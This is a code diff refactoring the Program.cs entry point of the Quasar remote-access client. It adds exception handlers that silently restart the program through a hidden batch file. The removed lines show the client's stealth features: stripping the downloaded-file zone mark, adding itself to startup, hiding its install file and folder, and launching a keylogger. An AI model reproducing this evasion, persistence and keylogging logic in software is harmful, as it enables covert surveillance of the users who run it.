@@ -1,15 +1,7 @@
-﻿using Quasar.Client.Commands;
-using Quasar.Client.Config;
-using Quasar.Client.Data;
-using Quasar.Client.Helper;
-using Quasar.Client.Installation;
-using Quasar.Client.IO;
-using Quasar.Client.Networking;
-using Quasar.Client.Utilities;
-using Quasar.Common.Helpers;
+﻿using Quasar.Client.IO;
 using System;
 using System.Diagnostics;
-using System.IO;
+using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -17,44 +9,32 @@ namespace Quasar.Client
 {
     internal static class Program
     {
-        public static QuasarClient ConnectClient;
-        private static ApplicationContext _msgLoop;
-
         [STAThread]
         private static void Main(string[] args)
         {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
+            // enable TLS 1.2
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+            // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
+            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
+
+            // Add the event handler for handling UI thread exceptions
+            Application.ThreadException += HandleThreadException;
+
+            // Add the event handler for handling non-UI thread exceptions
             AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
 
-            if (Settings.Initialize())
-            {
-                if (Initialize())
-                {
-                    if (!QuasarClient.Exiting)
-                        ConnectClient.Connect();
-                }
-            }
-
-            Cleanup();
-            Exit();
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new QuasarApplication());
         }
 
-        private static void Exit()
+        private static void HandleThreadException(object sender, ThreadExceptionEventArgs e)
         {
-            // Don't wait for other threads
-            if (_msgLoop != null || Application.MessageLoop)
-                Application.Exit();
-            else
-                Environment.Exit(0);
-        }
-
-        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
-        {
-            if (e.IsTerminating)
+            Debug.WriteLine(e);
+            try
             {
-                string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
-                if (string.IsNullOrEmpty(batchFile)) return;
+                string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
 
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
@@ -63,89 +43,47 @@ namespace Quasar.Client
                     FileName = batchFile
                 };
                 Process.Start(startInfo);
-                Exit();
+            }
+            catch (Exception exception)
+            {
+                Debug.WriteLine(exception);
+            }
+            finally
+            {
+                Environment.Exit(0);
             }
         }
 
-        private static void Cleanup()
+        /// <summary>
+        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
+        /// </summary>
+        /// <param name="sender">The source of the unhandled exception event.</param>
+        /// <param name="e">The exception event arguments. </param>
+        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
-            CommandHandler.CloseShell();
-            if (CommandHandler.StreamCodec != null)
-                CommandHandler.StreamCodec.Dispose();
-            if (Keylogger.Instance != null)
-                Keylogger.Instance.Dispose();
-            if (_msgLoop != null)
+            if (e.IsTerminating)
             {
-                _msgLoop.ExitThread();
-                _msgLoop.Dispose();
-                _msgLoop = null;
-            }
-            MutexHelper.CloseMutex();
-        }
-
-        private static bool Initialize()
-        {
-            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
-
-            // process with same mutex is already running
-            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
-                return false;
-
-            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
-            GeoLocationHelper.Initialize();
-            
-            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
-
-            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
-            {
-                WindowsAccountHelper.StartUserIdleCheckThread();
-
-                if (Settings.STARTUP)
+                Debug.WriteLine(e);
+                try
                 {
-                    if (!Startup.AddToStartup())
-                        ClientData.AddToStartupFailed = true;
-                }
+                    string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
 
-                if (Settings.INSTALL && Settings.HIDEFILE)
-                {
-                    try
+                    ProcessStartInfo startInfo = new ProcessStartInfo
                     {
-                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
-                    }
-                    catch (Exception)
-                    {
-                    }
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = true,
+                        FileName = batchFile
+                    };
+                    Process.Start(startInfo);
                 }
-                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
+                catch (Exception exception)
                 {
-                    try
-                    {
-                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
-                        di.Attributes |= FileAttributes.Hidden;
-
-                    }
-                    catch (Exception)
-                    {
-                    }
+                    Debug.WriteLine(exception);
                 }
-                if (Settings.ENABLELOGGER)
+                finally
                 {
-                    new Thread(() =>
-                    {
-                        _msgLoop = new ApplicationContext();
-                        Keylogger logger = new Keylogger(15000);
-                        Application.Run(_msgLoop);
-                    }) {IsBackground = true}.Start();
+                    Environment.Exit(0);
                 }
-
-                ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
-                return true;
-            }
-            else
-            {
-                MutexHelper.CloseMutex();
-                ClientInstaller.Install(ConnectClient);
-                return false;
             }
         }
     }
